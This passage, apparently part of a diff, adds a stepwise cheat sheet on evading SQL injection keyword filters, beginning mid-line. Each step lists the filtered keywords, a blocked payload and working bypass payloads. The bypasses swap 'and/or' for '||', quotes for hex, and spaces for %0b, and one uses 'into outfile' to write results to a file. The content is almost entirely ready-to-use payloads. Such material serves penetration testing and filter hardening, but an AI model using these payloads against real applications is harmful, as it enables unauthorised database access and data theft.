@@ -1,0 +1,47 @@
+     || (select user from users limit 1) = 'admin'
+    Bypassed Injection: 1 || (select user from users group by user_id having user_id = 1) = 'admin'
+
+• Step 4:
+
+Keywords Filtered: and, or, union, where, limit, group by
+
+    Blocked Attempt: 1 || (select user from users group by user_id having user_id = 1) = 'admin'
+    Bypassed Injection: 1 || (select substr(group_concat(user_id),1,1) user from users ) = 1
+
+• Step 5:
+
+Keywords Filtered: and, or, union, where, limit, group by, select
+
+    Blocked Attempt: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1
+    Bypassed Injection: 1 || 1 = 1 into outfile 'result.txt'
+    Bypassed Injection: 1 || substr(user,1,1) = 'a'
+
+• Step 6:
+
+Keywords Filtered: and, or, union, where, limit, group by, select, '
+
+    Blocked Attempt: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1
+    Bypassed Injection: 1 || user_id is not null
+    Bypassed Injection: 1 || substr(user,1,1) = 0x61
+    Bypassed Injection: 1 || substr(user,1,1) = unhex(61)
+
+• Step 7:
+
+Keywords Filtered: and, or, union, where, limit, group by, select, ', hex
+
+    Blocked Attempt: 1 || substr(user,1,1) = unhex(61)
+    Bypassed Injection: 1 || substr(user,1,1) = lower(conv(11,10,36))
+
+• Step 8:
+
+Keywords Filtered: and, or, union, where, limit, group by, select, ', hex, substr
+
+    Blocked Attempt: 1 || substr(user,1,1) = lower(conv(11,10,36))
+    Bypassed Injection: 1 || lpad(user,7,1)
+
+• Step 9:
+
+Keywords Filtered: and, or, union, where, limit, group by, select, ', hex, substr, white space
+
+    Blocked Attempt: 1 || lpad(user,7,1)
+    Bypassed Injection: 1%0b||%0blpad(user,7,1)
